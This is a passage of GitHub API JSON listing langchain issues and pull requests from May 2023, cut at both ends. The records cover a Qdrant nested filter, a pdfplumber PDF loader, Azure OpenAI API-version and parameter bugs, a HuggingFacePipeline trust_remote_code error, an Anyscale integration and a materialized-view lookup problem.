        "body": "# Add support for Qdrant nested filter\r\n\r\nThis extends the filter functionality for the Qdrant vectorstore. The current filter implementation is limited to a single-level metadata structure; however, Qdrant supports nested metadata filtering. This extends the functionality for users to maximize the filter functionality when using Qdrant as the vectorstore.\r\n\r\nReference: https://qdrant.tech/documentation/filtering/#nested-key\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4354/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4354/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4353",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4353/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4353/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4353/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4353",
        "id": 1700713112,
        "node_id": "PR_kwDOIPDwls5QBk_r",
        "number": 4353,
        "title": "Feature: add pdfplumber based PDF loader, with loader utilizing visual debugger",
        "user": {
            "login": "lesterpjy",
            "id": 13447955,
            "node_id": "MDQ6VXNlcjEzNDQ3OTU1",
            "avatar_url": "https://avatars.githubusercontent.com/u/13447955?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/lesterpjy",
            "html_url": "https://github.com/lesterpjy",
            "followers_url": "https://api.github.com/users/lesterpjy/followers",
            "following_url": "https://api.github.com/users/lesterpjy/following{/other_user}",
            "gists_url": "https://api.github.com/users/lesterpjy/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/lesterpjy/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/lesterpjy/subscriptions",
            "organizations_url": "https://api.github.com/users/lesterpjy/orgs",
            "repos_url": "https://api.github.com/users/lesterpjy/repos",
            "events_url": "https://api.github.com/users/lesterpjy/events{/privacy}",
            "received_events_url": "https://api.github.com/users/lesterpjy/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2023-05-08T18:24:30Z",
        "updated_at": "2023-05-15T02:56:21Z",
        "closed_at": "2023-05-15T02:56:20Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4353",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4353",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4353.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4353.patch",
            "merged_at": "2023-05-15T02:56:20Z"
        },
        "body": "# Add new PDF loader based on pdfplumber, and additional loader method for visual debugging\r\n\r\nFirst time contributing to open-source projects, any suggestions would be greatly appreciated. Thank you.\r\n<!--\r\n\r\nThank you for contributing to LangChain! Your PR will appear in our next release under the title you set. Please make sure it highlights your valuable contribution.\r\n\r\nReplace this with a description of the change, the issue it fixes (if applicable), and relevant context. List any dependencies required for this change.\r\n\r\nAfter you're done, someone will review your PR. They may suggest improvements. If no one reviews your PR within a few days, feel free to @-mention the same people again, as notifications can get lost.\r\n-->\r\n\r\n- Finding out whether PDFs are loaded cleanly/correctly into Documents can be significant work when dealing with more PDFs.\r\n- [pdfplumber](https://github.com/jsvine/pdfplumber) provides visual debugger for checking the PDF parse.\r\n- Goal: allow users to take advantage of pdfplumber's visual debugger when desired while keeping the `load` method unchanged.\r\n\r\n Integration includes \r\n\r\n1. A `load` method nearly identical to that of PyMuPDFLoader.\r\n2. A `annotate_and_load` method that takes advantage of pdfplumber's [visual debugging](https://github.com/jsvine/pdfplumber#visual-debugging) to save an annotated version of the PDF being loaded at an user defined directory.\r\n3. Example usage in `pdf.ipynb`\r\n4. Integration tests in `test_pdf.py`\r\n\r\n## Who can review?\r\n@hwchase17 \r\n@eyurtsev \r\n\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4353/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4353/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4352",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4352/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4352/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4352/events",
        "html_url": "https://github.com/langchain-ai/langchain/issues/4352",
        "id": 1700692794,
        "node_id": "I_kwDOIPDwls5lXoM6",
        "number": 4352,
        "title": "Azure OpenAIEmbeddings(chunk_size=1) is changing the API version of the openai",
        "user": {
            "login": "geg00",
            "id": 10646838,
            "node_id": "MDQ6VXNlcjEwNjQ2ODM4",
            "avatar_url": "https://avatars.githubusercontent.com/u/10646838?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/geg00",
            "html_url": "https://github.com/geg00",
            "followers_url": "https://api.github.com/users/geg00/followers",
            "following_url": "https://api.github.com/users/geg00/following{/other_user}",
            "gists_url": "https://api.github.com/users/geg00/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/geg00/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/geg00/subscriptions",
            "organizations_url": "https://api.github.com/users/geg00/orgs",
            "repos_url": "https://api.github.com/users/geg00/repos",
            "events_url": "https://api.github.com/users/geg00/events{/privacy}",
            "received_events_url": "https://api.github.com/users/geg00/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 8,
        "created_at": "2023-05-08T18:08:59Z",
        "updated_at": "2023-09-06T21:03:28Z",
        "closed_at": "2023-09-06T21:01:06Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### System Info\n\n\r\n(.venv) C:\\Users\\hbb9279\\OpenAI\\Files\\10K\\2019>python\r\nPython 3.11.3 (tags/v3.11.3:f3909b8, Apr  4 2023, 23:49:59) [MSC v.1934 64 bit (AMD64)] on win32\r\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\r\n>>>\r\n\r\nlangchain-0.0.162\r\n\r\nimport os\r\nimport openai\r\nopenai.api_type = \"azure\"\r\nopenai.api_base = \"https://<<deployment_id>>.openai.azure.com/\"\r\nopenai.api_version = \"2023-03-15-preview\"\r\n\r\nvectorstore = FAISS.from_documents(documents=documents, embedding = emb )\r\nemb = OpenAIEmbeddings(chunk_size=1)\r\n\r\nopenai.api_base, openai.api_version\r\n('https://<<deployment_id>>.openai.azure.com/', '2022-12-01')\r\n\r\nThen when you try to use the functionality, it will fail with resource not found. \r\n\r\nbecause the api_version with 2022-12-01 doesn't include the GPT-35-Turbo and GPT-4\r\n\r\n\ud83d\ude10\r\n\n\n### Who can help?\n\n@hwchase17 @vowelparrot @eyurtsev \n\n### Information\n\n- [ ] The official example notebooks/scripts\n- [ ] My own modified scripts\n\n### Related Components\n\n- [ ] LLMs/Chat Models\n- [X] Embedding Models\n- [ ] Prompts / Prompt Templates / Prompt Selectors\n- [ ] Output Parsers\n- [ ] Document Loaders\n- [ ] Vector Stores / Retrievers\n- [ ] Memory\n- [ ] Agents / Agent Executors\n- [ ] Tools / Toolkits\n- [ ] Chains\n- [ ] Callbacks/Tracing\n- [ ] Async\n\n### Reproduction\n\nimport os\r\nimport openai\r\nopenai.api_type = \"azure\"\r\nopenai.api_version = \"2023-03-15-preview\"\r\nemb = OpenAIEmbeddings(chunk_size=1)\r\n\r\nopenai.api_version\r\n>> '2022-12-01'\r\n\r\n\n\n### Expected behavior\n\nThe expectation is to keep the environmental variable the same way that I defined them without modifying them.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4352/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4352/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4351",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4351/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4351/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4351/events",
        "html_url": "https://github.com/langchain-ai/langchain/issues/4351",
        "id": 1700680363,
        "node_id": "I_kwDOIPDwls5lXlKr",
        "number": 4351,
        "title": "HuggingFacePipeline trust_remote_code:True allows download but not inference ",
        "user": {
            "login": "russellballestrini",
            "id": 909098,
            "node_id": "MDQ6VXNlcjkwOTA5OA==",
            "avatar_url": "https://avatars.githubusercontent.com/u/909098?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/russellballestrini",
            "html_url": "https://github.com/russellballestrini",
            "followers_url": "https://api.github.com/users/russellballestrini/followers",
            "following_url": "https://api.github.com/users/russellballestrini/following{/other_user}",
            "gists_url": "https://api.github.com/users/russellballestrini/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/russellballestrini/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/russellballestrini/subscriptions",
            "organizations_url": "https://api.github.com/users/russellballestrini/orgs",
            "repos_url": "https://api.github.com/users/russellballestrini/repos",
            "events_url": "https://api.github.com/users/russellballestrini/events{/privacy}",
            "received_events_url": "https://api.github.com/users/russellballestrini/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 6,
        "created_at": "2023-05-08T18:01:54Z",
        "updated_at": "2023-09-22T16:09:25Z",
        "closed_at": "2023-09-22T16:09:24Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### System Info\n\nLatest langchain version.\r\n\r\n\n\n### Who can help?\n\n_No response_\n\n### Information\n\n- [X] The official example notebooks/scripts\n- [X] My own modified scripts\n\n### Related Components\n\n- [X] LLMs/Chat Models\n- [ ] Embedding Models\n- [ ] Prompts / Prompt Templates / Prompt Selectors\n- [ ] Output Parsers\n- [ ] Document Loaders\n- [ ] Vector Stores / Retrievers\n- [ ] Memory\n- [ ] Agents / Agent Executors\n- [ ] Tools / Toolkits\n- [ ] Chains\n- [ ] Callbacks/Tracing\n- [ ] Async\n\n### Reproduction\n\nValueError: Loading mosaicml/mpt-7b-chat requires you to execute the configuration file in that repo on your local machine. Make sure you have read the code there to avoid malicious use, then set the option `trust_remote_code=True` to remove this error.\r\n\r\nAdding `trust_remote_code\":True` to model_kwargs allows you to download the models throws TypeError: transformers.pipelines.base.infer_framework_load_model() got multiple values for keyword argument 'trust_remote_code' later on after the download.\r\n\r\nlang_chain8.py\r\n```\r\nfrom langchain import HuggingFacePipeline\r\n\r\nllm = HuggingFacePipeline.from_model_id(model_id=\"mosaicml/mpt-7b-chat\", task=\"text-generation\", model_kwargs={\"temperature\":0.1, \"trust_remote_code\":True})\r\n\r\nfrom langchain import PromptTemplate,  LLMChain\r\n\r\ntemplate = \"\"\"Question: {question}\r\n\r\nAnswer: Let's think step by step.\"\"\"\r\nprompt = PromptTemplate(template=template, input_variables=[\"question\"])\r\n\r\nllm_chain = LLMChain(prompt=prompt, llm=llm)\r\n\r\nquestion = \"What is electroencephalography?\"\r\n\r\nprint(llm_chain.run(question))\r\n```\r\n\r\n```\r\npython lang_chain8.py\r\nLoading checkpoint shards: 100%|\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588| 2/2 [01:07<00:00, 33.72s/it]\r\nTraceback (most recent call last):\r\n  File \"/Users/russellballestrini/git/flaskchat/lang_chain8.py\", line 4, in <module>\r\n    llm = HuggingFacePipeline.from_model_id(model_id=\"mosaicml/mpt-7b-chat\", task=\"text-generation\", model_kwargs={\"temperature\":0.1, \"trust_remote_code\": True})\r\n          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n  File \"/Users/russellballestrini/git/flaskchat/env/lib/python3.11/site-packages/langchain/llms/huggingface_pipeline.py\", line 118, in from_model_id\r\n    pipeline = hf_pipeline(\r\n               ^^^^^^^^^^^^\r\n  File \"/Users/russellballestrini/git/flaskchat/env/lib/python3.11/site-packages/transformers/pipelines/__init__.py\", line 779, in pipeline\r\n    framework, model = infer_framework_load_model(\r\n                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\nTypeError: transformers.pipelines.base.infer_framework_load_model() got multiple values for keyword argument 'trust_remote_code'\r\n```\n\n### Expected behavior\n\nI expect to be able to run inference on any huggingface model even the untrusted ones.",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4351/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4351/timeline",
        "performed_via_github_app": null,
        "state_reason": "not_planned"
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4350",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4350/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4350/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4350/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4350",
        "id": 1700660007,
        "node_id": "PR_kwDOIPDwls5QBZY-",
        "number": 4350,
        "title": "Add LLMs support for Anyscale Service",
        "user": {
            "login": "kylehh",
            "id": 24217337,
            "node_id": "MDQ6VXNlcjI0MjE3MzM3",
            "avatar_url": "https://avatars.githubusercontent.com/u/24217337?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/kylehh",
            "html_url": "https://github.com/kylehh",
            "followers_url": "https://api.github.com/users/kylehh/followers",
            "following_url": "https://api.github.com/users/kylehh/following{/other_user}",
            "gists_url": "https://api.github.com/users/kylehh/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/kylehh/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/kylehh/subscriptions",
            "organizations_url": "https://api.github.com/users/kylehh/orgs",
            "repos_url": "https://api.github.com/users/kylehh/repos",
            "events_url": "https://api.github.com/users/kylehh/events{/privacy}",
            "received_events_url": "https://api.github.com/users/kylehh/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 4,
        "created_at": "2023-05-08T17:48:37Z",
        "updated_at": "2023-05-11T15:54:16Z",
        "closed_at": "2023-05-11T07:39:59Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4350",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4350",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4350.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4350.patch",
            "merged_at": "2023-05-11T07:39:59Z"
        },
        "body": "# Your PR Title (What it does)\r\n\r\n<!--\r\nThank you for contributing to LangChain! Your PR will appear in our next release under the title you set. Please make sure it highlights your valuable contribution.\r\n\r\nReplace this with a description of the change, the issue it fixes (if applicable), and relevant context. List any dependencies required for this change.\r\n\r\nAfter you're done, someone will review your PR. They may suggest improvements. If no one reviews your PR within a few days, feel free to @-mention the same people again, as notifications can get lost.\r\n-->\r\n\r\n<!-- Remove if not applicable -->\r\n\r\nAdd Anyscale service integration under LLM\r\n\r\n## Before submitting\r\n\r\n<!-- If you're adding a new integration, include an integration test and an example notebook showing its use! -->\r\nAdded integration test code. and sample code for using Ray to distribute service endpoint queries\r\n\r\n## Who can review?\r\n\r\nCommunity members can review the PR once tests pass. Tag maintainers/contributors who might be interested:\r\n @hwchase17 @agola11\r\n<!-- For a quicker response, figure out the right person to tag with @\r\n\r\n        @hwchase17 - project lead\r\n\r\n        Tracing / Callbacks\r\n        - @agola11\r\n\r\n        Async\r\n        - @agola11\r\n\r\n        DataLoader Abstractions\r\n        - @eyurtsev\r\n\r\n        LLM/Chat Wrappers\r\n        - @hwchase17\r\n        - @agola11\r\n\r\n        Tools / Toolkits\r\n        - @vowelparrot\r\n -->\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4350/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4350/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4349",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4349/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4349/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4349/events",
        "html_url": "https://github.com/langchain-ai/langchain/issues/4349",
        "id": 1700590442,
        "node_id": "I_kwDOIPDwls5lXPNq",
        "number": 4349,
        "title": "Materialized Views not accessible ",
        "user": {
            "login": "BenjiWilson",
            "id": 3466330,
            "node_id": "MDQ6VXNlcjM0NjYzMzA=",
            "avatar_url": "https://avatars.githubusercontent.com/u/3466330?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/BenjiWilson",
            "html_url": "https://github.com/BenjiWilson",
            "followers_url": "https://api.github.com/users/BenjiWilson/followers",
            "following_url": "https://api.github.com/users/BenjiWilson/following{/other_user}",
            "gists_url": "https://api.github.com/users/BenjiWilson/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/BenjiWilson/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/BenjiWilson/subscriptions",
            "organizations_url": "https://api.github.com/users/BenjiWilson/orgs",
            "repos_url": "https://api.github.com/users/BenjiWilson/repos",
            "events_url": "https://api.github.com/users/BenjiWilson/events{/privacy}",
            "received_events_url": "https://api.github.com/users/BenjiWilson/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 5,
        "created_at": "2023-05-08T16:51:57Z",
        "updated_at": "2023-11-02T14:36:05Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### System Info\n\nWhen specifying a materialized view in include_tables, the following error occurs:\r\n\r\ninclude_tables {'table_name'} not found in database\r\n\r\n\r\n\r\n\n\n### Who can help?\n\n_No response_\n\n### Information\n\n- [ ] The official example notebooks/scripts\n- [ ] My own modified scripts\n\n### Related Components\n\n- [ ] LLMs/Chat Models\n- [ ] Embedding Models\n- [ ] Prompts / Prompt Templates / Prompt Selectors\n- [ ] Output Parsers\n- [ ] Document Loaders\n- [ ] Vector Stores / Retrievers\n- [ ] Memory\n- [ ] Agents / Agent Executors\n- [ ] Tools / Toolkits\n- [X] Chains\n- [ ] Callbacks/Tracing\n- [ ] Async\n\n### Reproduction\n\ninclude_tables=['table1', 'table2']\r\n\r\ndb = SQLDatabase.from_uri(\"postgresql://xxx:xxx@xxx:5432/xxx\", include_tables=include_tables)\n\n### Expected behavior\n\nMaterialized views should be accessible.",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4349/reactions",
            "total_count": 2,
            "+1": 2,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4349/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4348",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4348/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4348/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4348/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4348",
        "id": 1700536500,
        "node_id": "PR_kwDOIPDwls5QA-9b",
        "number": 4348,
        "title": "InvalidRequestError: logprobs, best_of and echo parameters are no\u2026",
        "user": {
            "login": "jcomfort4",
            "id": 8152811,
            "node_id": "MDQ6VXNlcjgxNTI4MTE=",
            "avatar_url": "https://avatars.githubusercontent.com/u/8152811?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/jcomfort4",
            "html_url": "https://github.com/jcomfort4",
            "followers_url": "https://api.github.com/users/jcomfort4/followers",
            "following_url": "https://api.github.com/users/jcomfort4/following{/other_user}",
            "gists_url": "https://api.github.com/users/jcomfort4/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/jcomfort4/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/jcomfort4/subscriptions",
            "organizations_url": "https://api.github.com/users/jcomfort4/orgs",
            "repos_url": "https://api.github.com/users/jcomfort4/repos",
            "events_url": "https://api.github.com/users/jcomfort4/events{/privacy}",
            "received_events_url": "https://api.github.com/users/jcomfort4/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 4678528832,
                "node_id": "LA_kwDOIPDwls8AAAABFtyvQA",
                "url": "https://api.github.com/repos/langchain-ai/langchain/labels/question",
                "name": "question",
                "color": "d876e3",
                "default": true,
                "description": "Further information is requested"
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 9,
        "created_at": "2023-05-08T16:11:12Z",
        "updated_at": "2023-08-01T00:52:37Z",
        "closed_at": "2023-08-01T00:52:37Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4348",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4348",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4348.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4348.patch",
            "merged_at": null
        },
        "body": "\u2026t available on gpt-35-turbo model.\r\n\r\nThe error can be reproduced by following the current documentation here or runnig this code..\r\n\r\n```\r\n# Import Azure OpenAI\r\nfrom langchain.llms import AzureOpenAI\r\nimport openai\r\nimport os\r\n\r\nopenai.api_type = \"azure\"\r\nopenai.api_base = os.environ[\"OPENAI_API_BASE\"]\r\nopenai.api_version = \"2023-03-15-preview\"\r\nopenai.api_key = os.environ[\"OPENAI_API_KEY\"]\r\n\r\nllm = AzureOpenAI(deployment_name=os.environ[\"azure_deployment_name\"], model_name=\"gpt-35-turbo\")\r\n# Run the LLM\r\nprint(llm(\"What is the capital of Italy?\"))\r\n```\r\n\r\nError:\r\n```\r\nInvalidRequestError: logprobs, best_of and echo parameters are not available on gpt-35-turbo model. Please remove the parameter and try again. For more details, see https://go.microsoft.com/fwlink/?linkid=2227346.\r\n```\r\n\r\nTo fix this, I followed the stack overflow post [here](https://stackoverflow.com/questions/75884448/langchain-logprobs-best-of-and-echo-parameters-are-not-available-on-gpt-35-tur) -- the following code WILL work..\r\n\r\n```\r\nfrom langchain.llms import AzureOpenAI\r\nfrom typing import List,Dict,Any\r\nclass NewAzureOpenAI(AzureOpenAI):\r\n    stop: List[str] = None\r\n    @property\r\n    def _invocation_params(self) -> Dict[str, Any]:\r\n        params = super()._invocation_params\r\n        # fix InvalidRequestError: logprobs, best_of and echo parameters are not available on gpt-35-turbo model.\r\n        if self.model_name == \"gpt-35-turbo\":\r\n            params.pop('logprobs', None)\r\n            params.pop('best_of', None)\r\n            params.pop('echo', None)\r\n        return {**{\"engine\": self.deployment_name}, **params}\r\n    \r\nllm = NewAzureOpenAI(deployment_name=os.environ[\"azure_deployment_name\"],\r\n                     model_name=\"gpt-35-turbo\"\r\n                     ,temperature=0.9)\r\nprint(llm(\"Tell me a joke.\"))\r\n```\r\n\r\nResult:\r\n```\r\n\", \"Tell me a joke.\"],\r\n    [\"What's big, and weighs a lot? A huge weight.\", \"A huge weight.\"],\r\n    [\"What is black, white and red all over? A Newspaper.\", \"A Newspaper.\"],\r\n    [\"Why did the cookie go to the doctor? Because it felt crummy\", \"Because it felt crummy\"],\r\n    [\"Who tells the best egg jokes? Comedi-hens.\", \"Comedi-hens.\"],\r\n    [\"What do you call a can opener that doesn\u2019t work? A can\u2019t opener\", \"A can\u2019t opener\"],\r\n    [\"What starts with an E, ends with an E, but only contains one letter? An envelope.\", \"An envelope.\"],\r\n    [\"What\u2019s brown, has four legs and a trunk? A mouse on vacation\", \"A mouse on vacation\"],\r\n    [\"Why do we tell actors to \u201cbreak a leg?\u201d Because every play has a cast.\", \"Because every play has a cast.\"],\r\n    [\"Why wouldn\u2019t the shrimp share his treasure? Because he was a little shellfish.\", \"Because he was a little shellfish.\"],\r\n    [\"Why did the banana go to the doctor? Because it wasn\u2019t peeling well!\", \"Because it wasn\u2019t peeling well!\r\n```\r\n\r\n\r\n<!-- Remove if not applicable -->\r\n\r\nFixes # (issue)\r\n\r\n## Before submitting\r\n\r\n<!-- If you're adding a new integration, include an integration test and an example notebook showing its use! -->\r\n\r\n## Who can review?\r\n\r\n@hwchase17 @agola11 as this affects LLM/Chat Wrappers I am tagging you all as the most relevant reviewers. I'm sure that there is a better way to remove this params, but this seemed to be the best way that I could find. Please let me know if you think there is a better place for this.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4348/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4348/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4347",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4347/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4347/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4347/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4347",
        "id": 1700520431,
        "node_id": "PR_kwDOIPDwls5QA7a0",
        "number": 4347,
        "title": "added an option to extract more metadata from crawled websites",
        "user": {
            "login": "woodworker",
            "id": 85796,
            "node_id": "MDQ6VXNlcjg1Nzk2",
            "avatar_url": "https://avatars.githubusercontent.com/u/85796?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/woodworker",
            "html_url": "https://github.com/woodworker",
            "followers_url": "https://api.github.com/users/woodworker/followers",
            "following_url": "https://api.github.com/users/woodworker/following{/other_user}",
            "gists_url": "https://api.github.com/users/woodworker/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/woodworker/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/woodworker/subscriptions",
            "organizations_url": "https://api.github.com/users/woodworker/orgs",
            "repos_url": "https://api.github.com/users/woodworker/repos",
            "events_url": "https://api.github.com/users/woodworker/events{/privacy}",
            "received_events_url": "https://api.github.com/users/woodworker/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2023-05-08T16:01:23Z",
        "updated_at": "2023-05-09T17:18:34Z",
        "closed_at": "2023-05-09T17:18:34Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
